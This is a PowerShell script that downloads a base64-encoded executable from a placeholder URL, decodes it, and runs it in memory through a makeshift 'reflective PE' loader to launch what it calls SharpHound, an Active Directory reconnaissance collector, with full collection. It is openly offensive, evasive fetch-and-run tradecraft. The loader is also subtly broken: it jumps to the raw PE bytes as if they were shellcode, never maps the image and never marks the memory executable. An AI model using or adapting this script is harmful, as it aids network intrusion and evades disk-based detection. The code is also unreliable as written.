# Define the URL containing the base64 encoded string
$url = "http://example.com/base64encodedexe"

# Download the base64 encoded string from the URL
$base64String = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content

# Decode the base64 string to a byte array
$exeBytes = [System.Convert]::FromBase64String($base64String)

# Define a function to load and run the executable in memory
function Invoke-ReflectivePE {
    param (
        [byte[]]$PEBytes,
        [string]$Arguments
    )

    # Allocate memory for the executable
    $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $mem, $PEBytes.Length)

    # Define necessary delegates and unmanaged methods
    $PELoader = @"
using System;
using System.Runtime.InteropServices;

public class PELoader
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr GetProcAddressDelegate(IntPtr hModule, string procName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr LoadLibraryDelegate(string name);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate void RunPE(string arguments);

    public static void Execute(IntPtr mem, string arguments)
    {
        // Simple PE loader logic (this will vary based on actual implementation needs)
        IntPtr shellcode = mem; // Adjust this based on actual offset calculations

        RunPE run = (RunPE)Marshal.GetDelegateForFunctionPointer(shellcode, typeof(RunPE));
        run(arguments);
    }
}
"@

    Add-Type -TypeDefinition $PELoader -Language CSharp
    [PELoader]::Execute($mem, $Arguments)

    # Free the allocated memory
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($mem)
}

# Get the current working directory
$outputDirectory = (Get-Location).Path

# Define the arguments for SharpHound
$arguments = "-c All -o $outputDirectory"

# Invoke the reflective PE loader function with the decoded executable bytes and arguments
Invoke-ReflectivePE -PEBytes $exeBytes -Arguments $arguments

Write-Host "Running SharpHound with arguments: $arguments"
